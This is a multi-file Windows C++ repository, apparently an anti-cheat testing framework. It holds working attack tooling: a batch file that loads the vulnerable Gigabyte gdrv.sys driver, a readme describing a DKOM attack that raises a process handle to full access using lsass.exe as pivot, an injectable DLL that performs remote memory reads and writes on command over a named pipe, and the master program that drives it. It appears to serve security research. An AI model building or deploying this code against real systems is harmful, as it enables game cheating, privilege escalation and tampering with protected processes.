      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="pch.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HandleElevationDriver.cpp" />
    <ClCompile Include="pch.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
    <ProjectReference Include="..\DriverHelper\DriverHelper.vcxproj">
      <Project>{36244ba2-d910-4746-8ed2-7cfa55fb4de9}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="LoadDriver.bat" />
    <None Include="Readme.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HandleElevationDriver/HandleElevationDriver.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="pch.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="pch.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HandleElevationDriver.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="Readme.md" />
    <None Include="LoadDriver.bat">
      <Filter>Source Files</Filter>
    </None>
  </ItemGroup>
</Project>
```

`HandleElevationDriver/LoadDriver.bat`:

```bat
sc create Gigabyte binpath= "F:\Recon2019\AntiCheat-Testing-Framework\resources\gdrv.sys" type= kernel
sc start Gigabyte
```

`HandleElevationDriver/Readme.md`:

```md
# Handle Elevation Driver

## Introduction

Implementation that abuse of a vulnerable driver to Read/Write from physical memory in order to perform a **DKOM** attack. The module will locate the target handle from an specific process and elevate the GrantedAccess to get PROCESS_ALL_ACCESS.
The main purpose is to elevate a HANDLE so we don't need to create a new one.
This implementation uses gigabyte driver to achiev its goal, however, changing the vulnerable driver should be quite easy, given that all the methods are created in a modular way inside DriverHelper.

## Usage

This module makes use of **DriverHelper** and **CheatHelper**.
HandleHijakingMaster will create a NamedPipe that the DLL will use to receive instructions and then return information to the master (where all the bot logic should be located).

## Configuration

This module requires configuration:

- The following variables in config.ini need to the provided:

[Addresses]
```
startAddressPhyHigh=0x00000000
startAddressPhyLow=0x58A60000
startAddressPhy=0x0
```

[Handles]
```
requestHandleDrv=0x15FC
```

[Strings]
```
privotProc=lsass.exe
driverName=\\.\GIO
```


## Notes

- startPhysicalAddress: Physical memory to start looking for EPROCESS structures.
- driverName: Name of the driver device to exploit
- requestHandleDrv: HANDLE number to elevate and use as pivot
 

```

`HandleElevationDriver/pch.cpp`:

```cpp
// pch.cpp: source file corresponding to pre-compiled header; necessary for compilation to succeed

#include "pch.h"

// In general, ignore this file, but keep it around if you are using pre-compiled headers.

```

`HandleElevationDriver/pch.h`:

```h
// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file

#ifndef PCH_H
#define PCH_H

// TODO: add headers that you want to pre-compile here

#endif //PCH_H

```

`HandleHijackingDLL/HandleHijackingDLL.cpp`:

```cpp
// HandleHijackingDLL.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "CheatHelper.h"
#include <windows.h> 
#include <stdio.h>
#include <conio.h>
#include <tchar.h>
#include <string>
#include <iostream>

// EDIT if you modified the original name
char tmp[] = "\\\\.\\pipe\\driverbypass";


HANDLE hNamedPipe;
PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

int ConnectPipe(LPTSTR name)
{

	hNamedPipe = CreateFile(name, GENERIC_READ | GENERIC_WRITE,
		0, NULL, OPEN_EXISTING, 0, NULL);

	while (1)
	{
		if (hNamedPipe != INVALID_HANDLE_VALUE)
		{
			std::cout << "[+] Connected." << std::endl;
			break;
		}
		else
		{
			std::cout << "[-] Couldn't connect: " << std::dec << GetLastError() << std::endl;
			continue;
		}
	}
	return 0;
}

int WritePipe(struct PipeMessageResponse response)
{

	BOOL bWrite;
	DWORD dwWritten;
	//const char *buffer = "Ready";
	std::cout << "[+] Sending Msg: " << std::endl;
	std::cout << "\t[+] status: " << response.status << std::endl;
	std::cout << "\t[+] bytesRead: " << response.bytesRead << std::endl;
	std::cout << "\t[+] buffer: ";
	CheatHelper::PrintBytes((PVOID)response.buffer, response.bytesRead);
	bWrite = WriteFile(hNamedPipe, &response, sizeof(PipeMessageResponse), &dwWritten, NULL);
	if (!bWrite)
	{
		std::cout << "[-] Failed writing: " << std::dec << GetLastError() << std::endl;
		return 0;
	}
	else
	{
		std::cout << "\t[+] Success writing." << std::endl;
		return 1;
	}

}


int ReadPipe() {
	//HANDLE hHeap = GetProcessHeap();
	//void* message = HeapAlloc(hHeap, 0, BUFSIZE);
	//message = HeapAlloc(hHeap, 0, BUFSIZE);
	DWORD dwRead;
	BOOL bRead;
	std::cout << "[+] Waiting for message. " << std::endl;

	bRead = ReadFile(hNamedPipe, &PMRequest, sizeof(PipeMessageRequest), &dwRead, NULL);

	if (!bRead)
	{
		std::cout << "[-] Failed reading Pipe: " << std::dec << GetLastError() << std::endl;
		return 0;
	}
	else
	{
		std::cout << "\t[+] action: " << PMRequest.action << std::endl;
		std::cout << "\t[+] handle: 0x" << PMRequest.handle << std::endl;
		std::cout << "\t[+] address: 0x" << PMRequest.address << std::endl;
		std::cout << "\t[+] size: " << PMRequest.size << std::endl;
		std::cout << "\t[+] buffer: ";
		CheatHelper::PrintBytes((PVOID)PMRequest.buffer, PMRequest.size);
		return 1;
	}
}


int handleAction()
{
	switch (PMRequest.action) {
	case 0: //Ping
	{
		std::cout << '0' << std::endl;
		break;
	}
	case 1: //RPM
	{
		std::cout << '1' << std::endl;
		SIZE_T stRead = 0;

		int status = CheatHelper::RPM((HANDLE)PMRequest.handle, (LPCVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, &PMResponse.bytesRead);

		if (status == 0)//SUCCESS
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 2: //WPM
	{
		std::cout << '2' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::WPM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, &stWrite);
	
		if (status == 0) //SUCCESS
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 3: //CreatRemoteThread
	{
		std::cout << '3' << std::endl;
		break;
	}
	case 4: //NtReadVirtualMemory
	{
		std::cout << '4' << std::endl;

		auto status = CheatHelper::NtRVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, (PULONG)&PMResponse.bytesRead);
		
		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	
	}
	case 5: //NtWriteVirtualMemory
	{
		std::cout << '5' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::NtWVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, (PULONG)&stWrite);
		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	case 6: //ZwReadVirtualMemory
	{
		std::cout << '6' << std::endl;

		auto status = CheatHelper::ZwRVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, (PULONG)&PMResponse.bytesRead);

		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;

	}
	case 7: //ZwWriteVirtualMemory
	{
		std::cout << '7' << std::endl;
		SIZE_T stWrite = 0;

		int status = CheatHelper::ZwWVM((HANDLE)PMRequest.handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, (PULONG)&stWrite);
		if (status == 0)
		{
			PMResponse.status = 0;
			return 0;
		}

		PMResponse.status = 1;
		return 1;
	}
	default:
	{
		std::cout << "Default" << std::endl;
		return 1;
	}
	}
}




int main() {

	// UNCOMMENT IF: We need to delay the connection to the Master.
	//Sleep(300000);

	strncpy_s(CheatHelper::namedPipeName, tmp, _countof(tmp));

	CheatHelper::ConsoleSetup("Client");

	ConnectPipe(CheatHelper::namedPipeName);


	PMResponse.status = 1;

	WritePipe(PMResponse);

	while (1)
	{
		ReadPipe();


		//int handle = 0xBF8;
		//LPVOID buffer;
		//TODO: Add loop and reconnection
		int success = handleAction();

		
		WritePipe(PMResponse);

		// if it is the last possible action -> break
		if (PMRequest.action == 7)
		{
			break;
		}
		
	}

	
	
	
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		DisableThreadLibraryCalls(hModule);
		CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)main, NULL, NULL, NULL);
	}
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}




```

`HandleHijackingDLL/HandleHijackingDLL.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>15.0</VCProjectVersion>
    <ProjectGuid>{FA4A27D2-1F04-4DDA-A10C-D19640522328}</ProjectGuid>
    <Keyword>Win32Proj</Keyword>
    <RootNamespace>HandleHijackingDLL</RootNamespace>
    <WindowsTargetPlatformVersion>10.0.17763.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>DynamicLibrary</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v141</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>MultiByte</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;HANDLEHIJACKINGDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>Disabled</Optimization>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;HANDLEHIJACKINGDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <AdditionalDependencies>%(AdditionalDependencies)</AdditionalDependencies>
      <AdditionalLibraryDirectories>C:\Program Files (x86)\Microsoft Visual Studio\2017\Community\VC\Tools\MSVC\14.16.27023\lib\onecore\x64</AdditionalLibraryDirectories>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <PrecompiledHeader>Use</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;HANDLEHIJACKINGDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <PrecompiledHeader>NotUsing</PrecompiledHeader>
      <WarningLevel>Level3</WarningLevel>
      <Optimization>MaxSpeed</Optimization>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_CRT_SECURE_NO_WARNINGS;NDEBUG;HANDLEHIJACKINGDLL_EXPORTS;_WINDOWS;_USRDLL;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <AdditionalIncludeDirectories>$(SolutionDir)CheatHelper;%(AdditionalIncludeDirectories)</AdditionalIncludeDirectories>
    </ClCompile>
    <Link>
      <SubSystem>Windows</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h" />
    <ClInclude Include="targetver.h" />
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="HandleHijackingDLL.cpp" />
    <ClCompile Include="stdafx.cpp">
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">Create</PrecompiledHeader>
      <PrecompiledHeader Condition="'$(Configuration)|$(Platform)'=='Release|x64'">Create</PrecompiledHeader>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ProjectReference Include="..\CheatHelper\CheatHelper.vcxproj">
      <Project>{a080c117-d1db-4671-8217-65496573ba4d}</Project>
    </ProjectReference>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`HandleHijackingDLL/HandleHijackingDLL.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="stdafx.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="targetver.h">
      <Filter>Header Files</Filter>
    </ClInclude>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="stdafx.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="HandleHijackingDLL.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <None Include="README.md" />
  </ItemGroup>
</Project>
```

`HandleHijackingDLL/README.md`:

```md
# HandleHijacking DLL

## Introduction


## Usage

This module is used combinaded with **HandleHijackingMaster**. This is the DLL implementation that has to be injected into a process that already has a handle to the game.

HandleHijakingMaster will create a NamedPipe that this module uses to receive instructions and then return information to the master (where all the bot logic should be located).


## Combination with other techniques

- **RUNASKINVOKER**: By executing the game using this options we will prevent the Anti-cheat to fully protect the game end load the driver.



```

`HandleHijackingDLL/stdafx.cpp`:

```cpp
#include "stdafx.h"

```

`HandleHijackingDLL/stdafx.h`:

```h
// stdafx.h : include file for standard system include files,
// or project specific include files that are used frequently, but
// are changed infrequently
//

#pragma once

#include "targetver.h"

#define WIN32_LEAN_AND_MEAN             // Exclude rarely-used stuff from Windows headers
// Windows Header Files
#include <windows.h>



// reference additional headers your program requires here

```

`HandleHijackingDLL/targetver.h`:

```h
#pragma once

// Including SDKDDKVer.h defines the highest available Windows platform.

// If you wish to build your application for a previous Windows platform, include WinSDKVer.h and
// set the _WIN32_WINNT macro to the platform you wish to support before including SDKDDKVer.h.

#include <SDKDDKVer.h>

```

`HandleHijackingMaster/HandleHijackingMaster.cpp`:

```cpp
// HandleHijackingMaster.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include "pch.h"
#include "CheatHelper.h"
#include <iostream>

HANDLE hPipeServer;
HANDLE hProcessOP;
HANDLE hProcessNtOP;
HANDLE hHeap = GetProcessHeap();
void* message = HeapAlloc(hHeap, 0, BUFSIZE);

typedef struct _CLIENT_ID
{
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
}  OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef NTSTATUS(NTAPI* TNtOpenProcess)(PHANDLE ProcessHandle, ACCESS_MASK AccessMask, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientID);
TNtOpenProcess NtOpenProcess = NULL;

int StartPipe()
{
	//std::string namedPipeName = "\\\\.\\pipe\\driverbypass";
	//LPCSTR namedPipe = namedPipeName.c_str();
	hPipeServer = CreateNamedPipe(CheatHelper::namedPipeName, PIPE_ACCESS_DUPLEX | PIPE_TYPE_BYTE | PIPE_READMODE_BYTE,
		PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES, BUFSIZE, BUFSIZE, 0, NULL);

	if (hPipeServer != NULL)
	{
		std::cout << "[+] NamedPipe created: " << CheatHelper::namedPipeName << std::endl;
	}
	else
	{
		std::cout << "[-] Couldn't create: " << std::dec << GetLastError() << std::endl;
		return 0;
	}

	while (hPipeServer != NULL)
	{
		if (ConnectNamedPipe(hPipeServer, NULL) != FALSE)
		{
			std::cout << "[+] New connection received" << std::endl;
			break;
		}
	}
	return 1;
}

PipeMessageRequest PMRequest;
PipeMessageResponse PMResponse;

int ReadPipe() {
	DWORD dwRead;
	BOOL bRead;
	std::cout << "[+] Waiting for message. " << std::endl;
	
	bRead = ReadFile(hPipeServer, &PMResponse, sizeof(PipeMessageResponse), &dwRead, NULL);

	if (!bRead)
	{
		std::cout << "[-] Failed reading Pipe: " << std::dec << GetLastError() << std::endl;
		return 0;
	}
	else
	{
		if (PMResponse.status == 0)
		{
			std::cout << "\t[+] Status: Successful" << std::endl;
			if (PMRequest.action == 1 || PMRequest.action == 4 || PMRequest.action == 6)
			{
				std::cout << "\t[+] bytesRead: " << PMResponse.bytesRead << std::endl;
				std::cout << "\t[+] buffer: ";
				CheatHelper::PrintBytes((PVOID)PMResponse.buffer, PMResponse.bytesRead);
			}
		}
		else
		{
			std::cout << "\t[-] Status: Unsuccessful" << std::endl;
		}
		
		return 1;
	}
}

int WritePipe()
{

	BOOL bWrite;
	DWORD dwWritten;
	//const char *buffer = "Ready";
	std::cout << "[+] Sending Msg: " << std::endl;
	std::cout << "\t[+] action: "  << PMRequest.action << std::endl;
	std::cout << "\t[+] handle: 0x" << PMRequest.handle << std::endl;
	std::cout << "\t[+] address: 0x" << std::hex << PMRequest.address << std::endl;
	std::cout << "\t[+] size: " << PMRequest.size << std::endl;
	std::cout << "\t[+] buffer: ";
	CheatHelper::PrintBytes((PVOID)PMRequest.buffer, PMRequest.size);
	bWrite = WriteFile(hPipeServer, &PMRequest, sizeof(PipeMessageRequest), &dwWritten, NULL);
	if (!bWrite)
	{
		std::cout << "[-] Failed writing: " << std::dec << GetLastError() << std::endl;
		return 0;
	}
	else
	{
		std::cout << "[+] Success writing." << std::endl;
		return 1;
	}

}


void handleTests(HANDLE handle) 
{
	SIZE_T stRead = 0;
	SIZE_T stWrite = 0;

	PMRequest.action = 1;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::RPM((HANDLE)handle, (LPCVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, NULL);

	PMRequest.action = 2;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::WPM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 4;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::NtRVM((HANDLE)handle, (LPVOID)PMRequest.address, PMResponse.buffer, PMRequest.size, NULL);

	
	PMRequest.action = 5;
	CheatHelper::prepareRequest(PMRequest);

	CheatHelper::NtWVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 6;
	CheatHelper::prepareRequest(PMRequest);
	CheatHelper::ZwRVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

	PMRequest.action = 7;
	CheatHelper::prepareRequest(PMRequest);
	CheatHelper::ZwWVM((HANDLE)handle, (LPVOID)PMRequest.address, PMRequest.buffer, PMRequest.size, NULL);

}


int main()
{
	CheatHelper::loadConfig();

	// Setting up first action RPM
	//PMRequest.action = 1;
	PMRequest.handle = CheatHelper::requestHandleNP;
	PMRequest.address = 0x0;
	SecureZeroMemory(PMRequest.buffer, BUFSIZE);
	PMRequest.size = 0x0;

	DWORD processID = NULL;
	while (true)
	{
		processID = CheatHelper::GetProcId(CheatHelper::targetProc);
		if (processID != NULL)
		{
			std::cout << "[+] PID: 0x" << std::hex << processID << std::endl;
			break;//
		}
	}

	hProcessOP = OpenProcess(PROCESS_ALL_ACCESS, false, processID);
	if (!hProcessOP) {
		std::cout << "[-] OpenProcess: Unable to obtain handle " << std::dec << GetLastError() << std::endl;
	}
	else
	{
		std::cout << "[+] OpenProcess: 0x" << std::hex << hProcessOP << std::endl;
		//handleTests(hProcessOP);
	}


	if (!StartPipe())
	{
		return 0;
	}

	
	if (!ReadPipe())
	{	
		std::cout << "[-] Failed reading Pipe." << std::endl;
	}

	if (PMResponse.status == 0)
		return 0;
	else
		std::cout << "[+] Cheat ready." << std::endl;

	// Clean PMRequest.address
	PMRequest.address = 0x0;

	int i = 1;
	while (1)
	{
		PMRequest.action = i;

		// We need to set the config values somehow, this is quickest way I found
		CheatHelper::prepareRequest(PMRequest);

		if (!WritePipe())
		{
			std::cout << "[-] Failed writing Pipe." << std::endl;
		}

		if (!ReadPipe())
		{
			std::cout << "[-] Failed reading Pipe." << std::endl;
		}

		if (i == 7)
			break;
		i++;
	}

	
    std::cout << "End!\n"; 
}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
